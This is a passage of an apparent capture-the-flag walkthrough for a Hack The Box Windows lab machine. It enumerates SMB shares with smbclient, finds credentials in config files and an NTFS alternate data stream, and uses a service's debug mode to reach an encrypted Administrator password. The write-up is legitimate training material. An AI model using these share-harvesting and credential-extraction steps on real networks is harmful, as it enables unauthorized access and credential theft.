</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient -L 10.10.10.178 -N
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Sharename       Type      Comment
</span></span><span class=line><span class=cl>        ---------       ----      -------
</span></span><span class=line><span class=cl>        ADMIN$          Disk      Remote Admin
</span></span><span class=line><span class=cl>        C$              Disk      Default share
</span></span><span class=line><span class=cl>        Data            Disk
</span></span><span class=line><span class=cl>        IPC$            IPC       Remote IPC
</span></span><span class=line><span class=cl>        Secure$         Disk
</span></span><span class=line><span class=cl>        Users           Disk
</span></span><span class=line><span class=cl>Reconnecting with SMB1 for workgroup listing.
</span></span><span class=line><span class=cl>do_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT)
</span></span><span class=line><span class=cl>Unable to connect with SMB1 -- no workgroup available
</span></span></code></pre></td></tr></table></div></div><p>We can anonymously connect to <code>Users</code> share and list folders in there to list
users:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient -N \\\\10.10.10.178\\Users
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; recurse on
</span></span><span class=line><span class=cl>smb: \&gt; prompt off
</span></span><span class=line><span class=cl>smb: \&gt; mget *
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \Administrator\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \C.Smith\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \L.Frost\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \TempUser\*
</span></span></code></pre></td></tr></table></div></div><p>This way we found 5 users.</p><p>Currently we can&rsquo;t enumerate what is inside <code>Secure</code> share.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient -N \\\\10.10.10.178\\Secure
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>tree connect failed: NT_STATUS_BAD_NETWORK_NAME
</span></span></code></pre></td></tr></table></div></div><p>By enumerating the <code>Data</code> share we can find some interesting files:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient -N \\\\10.10.10.178\\Data
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; recurse on
</span></span><span class=line><span class=cl>smb: \&gt; prompt off
</span></span><span class=line><span class=cl>smb: \&gt; mget *
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \IT\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \Production\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \Reports\*
</span></span><span class=line><span class=cl>getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec)
</span></span></code></pre></td></tr></table></div></div><p>By reading a welcome email we can find a generic account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat smb/Shared/Templates/HR/Welcome\ Email.txt
</span></span><span class=line><span class=cl>We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>You will find your home folder in the following location:
</span></span><span class=line><span class=cl>\\HTB-NEST\Users\&lt;USERNAME&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>If you have any issues accessing specific services or workstations, please inform the
</span></span><span class=line><span class=cl>IT department and use the credentials below until all systems have been set up for you.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Username: TempUser
</span></span><span class=line><span class=cl>Password: welcome2019
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thank you
</span></span><span class=line><span class=cl>HR
</span></span></code></pre></td></tr></table></div></div><h3 id=network-exploration-finding-csmith>Network Exploration: finding c.smith<a hidden class=anchor aria-hidden=true href=#network-exploration-finding-csmith>#</a></h3><p><strong>TL;DR</strong>: listing SMB shares again</p><p>We can enumerate <code>Data</code> share again but using the <code>TempUser</code> account this time,
to list files we weren&rsquo;t able to see earlier:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient \\\\10.10.10.178\\Data -U TempUser
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>Enter WORKGROUP\TempUser&#39;s password:
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; recurse on
</span></span><span class=line><span class=cl>smb: \&gt; prompt off
</span></span><span class=line><span class=cl>smb: \&gt; mget *
</span></span><span class=line><span class=cl>getting file \IT\Configs\Adobe\editing.xml of size 246 as editing.xml (1,9 KiloBytes/sec) (average 1,9 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\Adobe\Options.txt of size 0 as Options.txt (0,0 KiloBytes/sec) (average 1,1 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\Adobe\projects.xml of size 258 as projects.xml (0,4 KiloBytes/sec) (average 0,6 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\Adobe\settings.xml of size 1274 as settings.xml (10,0 KiloBytes/sec) (average 1,8 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\Atlas\Temp.XML of size 1369 as Temp.XML (4,1 KiloBytes/sec) (average 2,4 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\Microsoft\Options.xml of size 4598 as Options.xml (36,2 KiloBytes/sec) (average 5,3 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as config.xml (50,4 KiloBytes/sec) (average 8,9 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\NotepadPlusPlus\shortcuts.xml of size 2108 as shortcuts.xml (16,6 KiloBytes/sec) (average 9,5 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as RU_config.xml (2,1 KiloBytes/sec) (average 9,0 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 8,4 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (3,4 KiloBytes/sec) (average 8,1 KiloBytes/sec)
</span></span></code></pre></td></tr></table></div></div><p>One of the file we retrieved is containing a password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ grep -ri pass smb
</span></span><span class=line><span class=cl>smb/IT/Configs/RU Scanner/RU_config.xml:  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
</span></span><span class=line><span class=cl>smb/Shared/Templates/HR/Welcome Email.txt:Password: welcome2019
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat &#39;smb/IT/Configs/RU Scanner/RU_config.xml&#39;
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;ConfigFile xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;Port&gt;389&lt;/Port&gt;
</span></span><span class=line><span class=cl>  &lt;Username&gt;c.smith&lt;/Username&gt;
</span></span><span class=line><span class=cl>  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
</span></span><span class=line><span class=cl>&lt;/ConfigFile&gt;
</span></span></code></pre></td></tr></table></div></div><p>The <em>RU Scanner</em> password is ciphered but pasting
<code>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</code> in a search we can find some
code snippets that are able to decipher it.</p><ul><li>VB.Net: <a href=https://dotnetfiddle.net/kiYWi4>https://dotnetfiddle.net/kiYWi4</a></li><li>VB.Net: <a href=https://dotnetfiddle.net/vYnZLb>https://dotnetfiddle.net/vYnZLb</a></li></ul><p>Deciphered password is <code>xRxRxPANCAK3SxRxRx</code> for <code>c.smith</code> user.</p><p>There is another file hinting us some files:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ tail smb/IT/Configs/NotepadPlusPlus/config.xml
</span></span><span class=line><span class=cl>        &lt;Find name=&#34;redeem on&#34; /&gt;
</span></span><span class=line><span class=cl>        &lt;Find name=&#34;192&#34; /&gt;
</span></span><span class=line><span class=cl>        &lt;Replace name=&#34;C_addEvent&#34; /&gt;
</span></span><span class=line><span class=cl>    &lt;/FindHistory&gt;
</span></span><span class=line><span class=cl>    &lt;History nbMaxFile=&#34;15&#34; inSubMenu=&#34;no&#34; customLength=&#34;-1&#34;&gt;
</span></span><span class=line><span class=cl>        &lt;File filename=&#34;C:\windows\System32\drivers\etc\hosts&#34; /&gt;
</span></span><span class=line><span class=cl>        &lt;File filename=&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34; /&gt;
</span></span><span class=line><span class=cl>        &lt;File filename=&#34;C:\Users\C.Smith\Desktop\todo.txt&#34; /&gt;
</span></span><span class=line><span class=cl>    &lt;/History&gt;
</span></span><span class=line><span class=cl>&lt;/NotepadPlus&gt;
</span></span></code></pre></td></tr></table></div></div><p>So we can go back to <code>Users</code> share with a real user this time (<code>c.smith</code>) and
download all his personal files.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient \\\\10.10.10.178\\Users -U &#39;c.smith&#39;
</span></span><span class=line><span class=cl>smb: \&gt; recurse on
</span></span><span class=line><span class=cl>smb: \&gt; prompt off
</span></span><span class=line><span class=cl>smb: \&gt; mget *
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \Administrator\*
</span></span><span class=line><span class=cl>getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (42,7 KiloBytes/sec) (average 42,7 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as Debug Mode Password.txt (0,0 KiloBytes/sec) (average 34,7 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml (1,9 KiloBytes/sec) (average 27,8 KiloBytes/sec)
</span></span><span class=line><span class=cl>getting file \C.Smith\user.txt of size 32 as user.txt (0,3 KiloBytes/sec) (average 23,2 KiloBytes/sec)
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \L.Frost\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
</span></span><span class=line><span class=cl>NT_STATUS_ACCESS_DENIED listing \TempUser\*
</span></span></code></pre></td></tr></table></div></div><p>This is where we find the user flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat smb/C.Smith/user.txt
</span></span><span class=line><span class=cl>cf71b25404be5d84fd827e05f426e987
</span></span></code></pre></td></tr></table></div></div><h3 id=alternate-data-stream-ads>Alternate Data Stream (ADS)<a hidden class=anchor aria-hidden=true href=#alternate-data-stream-ads>#</a></h3><p><strong>TL;DR</strong>: password of HQK Reporting via ADS</p><p>Inside <code>Users</code> share, in the <code>C.Smith</code> folder, there are files related to
<code>HQK Reporting</code> software.</p><p>There is a promising <code>Debug Mode Password.txt</code> files but the files ize is 0 byte.</p><p>This gives us an hint an ADS (Alternate Data Stream) may be used.</p><p>As you can see below the default <code>$DATA</code> stream is 0 byte when an alternate
stream named <code>Password</code> is 15 bytes. So we can download the file via the non-default
data stream.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient \\\\10.10.10.178\\Users -U &#39;c.smith&#39;
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>Enter WORKGROUP\c.smith&#39;s password:
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; cd &#34;C.Smith\HQK Reporting&#34;
</span></span><span class=line><span class=cl>smb: \C.Smith\HQK Reporting\&gt; allinfo &#34;Debug Mode Password.txt&#34;
</span></span><span class=line><span class=cl>altname: DEBUGM~1.TXT
</span></span><span class=line><span class=cl>create_time:    ven. ao├╗t  9 01:06:12 2019 CEST
</span></span><span class=line><span class=cl>access_time:    ven. ao├╗t  9 01:06:12 2019 CEST
</span></span><span class=line><span class=cl>write_time:     ven. ao├╗t  9 01:08:17 2019 CEST
</span></span><span class=line><span class=cl>change_time:    ven. ao├╗t  9 01:08:17 2019 CEST
</span></span><span class=line><span class=cl>attributes: A (20)
</span></span><span class=line><span class=cl>stream: [::$DATA], 0 bytes
</span></span><span class=line><span class=cl>stream: [:Password:$DATA], 15 bytes
</span></span><span class=line><span class=cl>smb: \C.Smith\HQK Reporting\&gt; get &#34;Debug Mode Password.txt:Password:$DATA&#34;
</span></span><span class=line><span class=cl>getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
</span></span><span class=line><span class=cl>smb: \C.Smith\HQK Reporting\&gt;
</span></span></code></pre></td></tr></table></div></div><p>In this stream the file contains the password for accessing teh debug mode:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat smb/Debug\ Mode\ Password.txt:Password:\$DATA
</span></span><span class=line><span class=cl>WBQ201953D8w
</span></span></code></pre></td></tr></table></div></div><h3 id=network-service-exploitation-finding-administrator>Network service exploitation: finding Administrator<a hidden class=anchor aria-hidden=true href=#network-service-exploitation-finding-administrator>#</a></h3><p><strong>TL;DR</strong>: HQK Reporting debug mode, read LDAP config for Admin password</p><p>Now looking at the backup config file <code>HQK_Config_Backup.xml</code> we can see the
service is running on port <code>4386</code>. The open port we saw earlier with <a href=https://nmap.org/>nmap</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat C.Smith/HQK\ Reporting/HQK_Config_Backup.xml
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;ServiceSettings xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;Port&gt;4386&lt;/Port&gt;
</span></span><span class=line><span class=cl>  &lt;QueryDirectory&gt;C:\Program Files\HQK\ALL QUERIES&lt;/QueryDirectory&gt;
</span></span><span class=line><span class=cl>&lt;/ServiceSettings&gt;
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s open a TCP socket with <code>telnet</code> to interact with the protocol:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ telnet 10.10.10.178 4386 
</span></span><span class=line><span class=cl>Trying 10.10.10.178...
</span></span><span class=line><span class=cl>Connected to 10.10.10.178.
</span></span><span class=line><span class=cl>Escape character is &#39;^]&#39;.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HQK Reporting Service V1.2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt;help
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This service allows users to run queries against databases using the legacy HQK format
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- AVAILABLE COMMANDS ---
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>LIST
</span></span><span class=line><span class=cl>SETDIR &lt;Directory_Name&gt;
</span></span><span class=line><span class=cl>RUNQUERY &lt;Query_ID&gt;
</span></span><span class=line><span class=cl>DEBUG &lt;Password&gt;
</span></span><span class=line><span class=cl>HELP &lt;Command&gt;
</span></span></code></pre></td></tr></table></div></div><p>We can see there is a <code>DEBUG &lt;Password></code> command requiring a password.
All good we have one!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;DEBUG WBQ201953D8w
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debug mode enabled. Use the HELP command to view additional commands that are now available
</span></span><span class=line><span class=cl>&gt;help
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This service allows users to run queries against databases using the legacy HQK format
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- AVAILABLE COMMANDS ---
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>LIST
</span></span><span class=line><span class=cl>SETDIR &lt;Directory_Name&gt;
</span></span><span class=line><span class=cl>RUNQUERY &lt;Query_ID&gt;
</span></span><span class=line><span class=cl>DEBUG &lt;Password&gt;
</span></span><span class=line><span class=cl>HELP &lt;Command&gt;
</span></span><span class=line><span class=cl>SERVICE
</span></span><span class=line><span class=cl>SESSION
</span></span><span class=line><span class=cl>SHOWQUERY &lt;Query_ID&gt;
</span></span></code></pre></td></tr></table></div></div><p>We have 3 new commands now, but let&rsquo;s start we the other commands we already had.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;LIST
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> QUERY FILES IN CURRENT DIRECTORY
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[DIR]  COMPARISONS
</span></span><span class=line><span class=cl>[1]   Invoices (Ordered By Customer)
</span></span><span class=line><span class=cl>[2]   Products Sold (Ordered By Customer)
</span></span><span class=line><span class=cl>[3]   Products Sold In Last 30 Days
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current Directory: ALL QUERIES
</span></span></code></pre></td></tr></table></div></div><p>It looks like <code>LIST</code> = <code>ls</code> and <code>SETDIR</code> = <code>cd</code>, it&rsquo;s obvious.</p><p>We are currently in <code>ALL QUERIES</code> directory. Let&rsquo;s go back upper in the tree:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;setdir ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current directory set to HQK
</span></span><span class=line><span class=cl>&gt;list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> QUERY FILES IN CURRENT DIRECTORY
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[DIR]  ALL QUERIES
</span></span><span class=line><span class=cl>[DIR]  LDAP
</span></span><span class=line><span class=cl>[DIR]  Logs
</span></span><span class=line><span class=cl>[1]   HqkSvc.exe
</span></span><span class=line><span class=cl>[2]   HqkSvc.InstallState
</span></span><span class=line><span class=cl>[3]   HQK_Config.xml
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current Directory: HQK
</span></span></code></pre></td></tr></table></div></div><p>We went in <code>HQK</code> directory and there is a <code>LDAP</code> directory in it.
Let&rsquo;s see this one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;setdir LDAP
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current directory set to LDAP
</span></span><span class=line><span class=cl>&gt;list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> QUERY FILES IN CURRENT DIRECTORY
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[1]   HqkLdap.exe
</span></span><span class=line><span class=cl>[2]   Ldap.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Current Directory: LDAP
</span></span></code></pre></td></tr></table></div></div><p>There is a config file and config files are prone to give passwords, so let&rsquo;s
read it.
Hopefully with the debug mode we unlocked the <code>showquery</code> = <code>cat</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;showquery 2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Domain=nest.local
</span></span><span class=line><span class=cl>Port=389
</span></span><span class=line><span class=cl>BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
</span></span><span class=line><span class=cl>User=Administrator
</span></span><span class=line><span class=cl>Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
